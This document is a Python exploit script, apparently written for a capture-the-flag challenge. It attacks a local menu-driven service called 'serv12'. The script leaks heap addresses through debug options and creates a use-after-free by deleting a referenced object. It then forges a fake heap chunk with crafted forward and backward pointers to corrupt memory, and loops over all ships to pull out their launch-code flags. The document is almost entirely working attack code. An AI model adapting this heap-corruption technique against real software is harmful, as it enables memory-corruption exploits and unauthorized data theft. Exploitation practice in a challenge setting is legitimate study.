#!/usr/bin/env python3

import subprocess as sp,sys,time,re,string
import threading
from struct import *
idx_read = 0
def read_until(s,c):
    global idx_read
    print("Read idx %d"%idx_read)
    idx_read+=1
    cc = s.read(1)
    mes=b""
    while cc != c:
        mes+=cc
#        sys.stdout.write(cc.decode())
        cc = s.read(1)
        if len(cc)==0:
            break
    mes += cc
    print("<-",mes)
    try:
        return mes.decode()
    except:
        return mes
def send_mes(s,mes):
    if (type(mes) == type(b"a")):
        mes += b"\n"
        print("->",mes)
        s.write(mes)
    elif (type(mes) == type("a")):
        mes += "\n"
        print("->",mes.encode())
        s.write(mes.encode())
    else:
        print("Cannot encode")
    s.flush()
    #time.sleep(0.5)

def AllocSpaceship(s,idx,name):
    send_mes(s.stdin,"1")
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%d" % idx)
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%s" %name)
    return read_until(s.stdout,b">")

def AllocSpaceman(s,idx,name,password):
    send_mes(s.stdin,"2")
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%d" % idx)
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%s" % name)
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%s" % password)
    return read_until(proc.stdout,b">")

def EditSpaceship(s,idx,name,launch,access,pilot_idx,\
                            medic_idx, engineer_idx,Capitan_idx):
    res=""
    send_mes(s.stdin,"5")
    res+=read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%d" %idx)
    res+=read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%s" %name)
    res+=read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%s" %launch)
    res+=read_until(s.stdout,b"\n")
    res+=read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%s" %access)
    res+=read_until(s.stdout,b"\n")
    res+=read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%d" %pilot_idx)
    res+=read_until(s.stdout,b"\n")
    res+=read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%d" %medic_idx)
    res+=read_until(s.stdout,b"\n")
    res+=read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%d" %engineer_idx)
    res+=read_until(s.stdout,b"\n")
    res+=read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%d" %Capitan_idx)
    res+=read_until(s.stdout,b">")
    return res
def EditSpaceman(s,idx,name,password):
    send_mes(s.stdin,"8")
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%d" %idx)
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,name)
    read_until(s.stdout,b"\n")
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,password)
    res=read_until(s.stdout,b">")
    return res
def SpacemanAddr(s,idx):
    send_mes(s.stdin,"255")
    cont = read_until(s.stdout,b">")
    all = re.findall(r'([0-9A-F]+)',cont)
    return int(all[idx],16)

def SpaceshipAddr(s,idx):
    send_mes(s.stdin,"254")
    cont = read_until(s.stdout,b">")
    all = re.findall(r'([0-9A-F]+)',cont)
    return int(all[idx],16)

def DeleteSpaceman(s,idx):
    send_mes(s.stdin,"4")
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%d" %idx)
    read_until(s.stdout,b">")

def DumpAddr(s,addr,qw):
    send_mes(s.stdin,"257")
    cont = read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%d"%addr)
    cont = read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%d"%qw)
    cont = read_until(s.stdout,b">")
    print(cont)
def ViewSpaceman(s,idx):
    send_mes(s.stdin,"7")
    read_until(s.stdout,b"\n")
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%d" %idx)
    a=read_until(s.stdout,b">")
    return a
def ViewSpaceship(s,idx):
    send_mes(s.stdin,"6")
    read_until(s.stdout,b"\n")
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%d" %idx)
    a=read_until(s.stdout,b">")
    return a
def ViewLaunch(s,idx,access):
    send_mes(s.stdin,"9")
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%d" %idx)
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,access)
    a=read_until(s.stdout,b">")
    return a
def StoreSpaceship(s,idx):
    send_mes(s.stdin,"13")
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%d" %idx)
    return read_until(s.stdout,b">")
def LoadSpaceship(s,name):
    send_mes(s.stdin,"14")
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,name)
    return read_until(s.stdout,b">")
def ViewLaunch(s,idx,acc):
    send_mes(s.stdin,"9")
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,"%d"%idx)
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,acc)
    return read_until(s.stdout,b">")
def SearchSpaceship(s,tmp):
    send_mes(s.stdin,"15")
    read_until(s.stdout,b"\n")
    read_until(s.stdout,b"\n")
    send_mes(s.stdin,tmp[:3])
    return read_until(s.stdout,b">")
def quit_function(fn_name):
    # print to stderr, unbuffered in Python 2.
    print('{0} took too long'.format(fn_name), file=sys.stderr)
    sys.stderr.flush() # Python 3 stderr is likely buffered.
    thread.interrupt_main() # raises KeyboardInterrupt
def exit_after(s):
    '''
    use as decorator to exit process if
    function takes longer than s seconds
    '''
    def outer(fn):
        def inner(*args, **kwargs):
            timer = threading.Timer(s, quit_function, args=[fn.__name__])
            timer.start()
            try:
                result = fn(*args, **kwargs)
            finally:
                timer.cancel()
            return result
        return inner
    return outer
#@exit_after(15)
def attack1(proc,nam):
    for i in range(9):
        AllocSpaceman(proc,i,"df","sfda")
    AllocSpaceman(proc,9,"df","sfda")
    AllocSpaceman(proc,10,"df","sfda")
    LoadSpaceship(proc,nam)


    adr9=SpacemanAddr(proc,9)
    adr10=SpacemanAddr(proc,10)
    adr11=SpaceshipAddr(proc,0) + 40 + 48 - 8

    EditSpaceship(proc,0,"","","",9,9,9,9)
    DeleteSpaceman(proc,9)
    a=ViewSpaceman(proc,9)
    print(a)
    if type(a) != type(b''):
        a = a.encode()
    aa=re.findall(b'Name: (.+)\nShip',a)
    aa[0] = aa[0] + b'\x00' * (8-len(aa[0]))
    adr_f1 = unpack("<Q",aa[0])
    print("Addr:",hex(adr_f1[0]+0x14500+560))
    adr_f1 = adr_f1[0]+0x14500+560
    AllocSpaceship(proc,1,"ZZzzzzzzzz")
    for i in range(9):
        DeleteSpaceman(proc,i)

    a1 = b"a" * 0x0 # prev size
    a1 += pack("<Q",0x80) # fake chunk size
    a1 += pack("<Q",adr_f1)  # address of forward free
    a1 += pack("<Q",adr_f1+8)# address of backward free
    a1 += b'c' * (0x80-4*8) # fill
    a1 += pack("<Q",0x80)  # prev chunk size
    a1 += pack("<Q",0x90)  # chunk size, prev is free
    a1 += b'd'*8
    print("AfterEdit")
    EditSpaceman(proc,9,a1,"")
    DumpAddr(proc,adr9,12)
    DumpAddr(proc,adr10-32,12)
    DumpAddr(proc,adr11,12)

    DeleteSpaceman(proc,10)

    DumpAddr(proc,adr9,12)
    DumpAddr(proc,adr10-32,12)
    DumpAddr(proc,adr11,12)

    res=ViewSpaceship(proc,0)
    print(res)
    mkey = re.findall(r'Medic: ([0-9A-z]+)\n',res)
    cnt = ViewLaunch(proc,0,mkey[0])
    print(cnt)
    res = re.findall(r'Launch code: ([0-9A-z=]+)\n',cnt)
    return res # D1KHH7B6,J93RG46

proc = sp.Popen("./serv12",shell=True,stdin=sp.PIPE,stdout=sp.PIPE)
res = read_until(proc.stdout,b"\n")
res = read_until(proc.stdout,b">")

all_ships = []
for i in string.ascii_uppercase:
    aa=SearchSpaceship(proc,str(i))
    res=re.findall(r'([0-9A-Z]{8})\n',aa)
    for r in res:
        all_ships.append(r)
print(all_ships)
flags = []
for sh in all_ships:
    try:
        proc = sp.Popen("./serv12",shell=True,stdin=sp.PIPE,stdout=sp.PIPE)
        res = read_until(proc.stdout,b"\n")
        res = read_until(proc.stdout,b">")
        r=attack1(proc,sh)
        flags.append(r)
    except:
        print("No flag %s\n"%sh)
print(flags)
